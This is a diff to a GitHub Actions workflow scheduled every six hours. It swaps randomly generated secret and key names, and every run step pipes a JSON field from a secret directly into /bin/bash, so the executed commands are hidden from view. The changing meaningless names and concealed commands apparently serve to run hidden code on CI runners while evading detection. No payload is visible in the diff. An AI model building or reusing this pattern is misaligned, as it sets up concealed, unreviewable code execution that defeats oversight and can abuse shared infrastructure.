@@ -2,31 +2,17 @@ name: yutingqqq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
-
-jobs:  # 7730
+    - cron: '38 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yutingqqq
         env:
-          ms9257: ${{ secrets.ms9257 }}
+          vxcam7005: ${{ secrets.vxcam7005 }}
         run: |
-          echo $ms9257 | jq -r .ycal595 | /bin/bash
-          echo $ftcp544 | jq -r .bmz81359 | /bin/bash
-          echo $ifvin76 | jq -r .edagq586 | /bin/bash
-          echo $gt4 | jq -r .vog64183 | /bin/bash
-          echo $cnpoc7643 | jq -r .tcmsn07350 | /bin/bash
-          echo $cf90783 | jq -r .x61 | /bin/bash
-          echo $yiq1 | jq -r .mayxl5 | /bin/bash
-          echo $v46785 | jq -r .anovy8395 | /bin/bash
-          echo $xiuib55908 | jq -r .jn76 | /bin/bash
-          echo $v6586 | jq -r .sx889 | /bin/bash
-          echo $tki5751 | jq -r .noi43 | /bin/bash
-          echo $z12310 | jq -r .yx60861 | /bin/bash
-          echo $snj37993 | jq -r .a9697 | /bin/bash
-          echo $aosts83153 | jq -r .o64 | /bin/bash
-          echo $jukm01811 | jq -r .umgq4177 | /bin/bash
-          echo $etl75 | jq -r .dpqv39620 | /bin/bash
+          echo $vxcam7005 | jq -r .r971 | /bin/bash
+          echo $cywz59 | jq -r .yku7 | /bin/bash
 
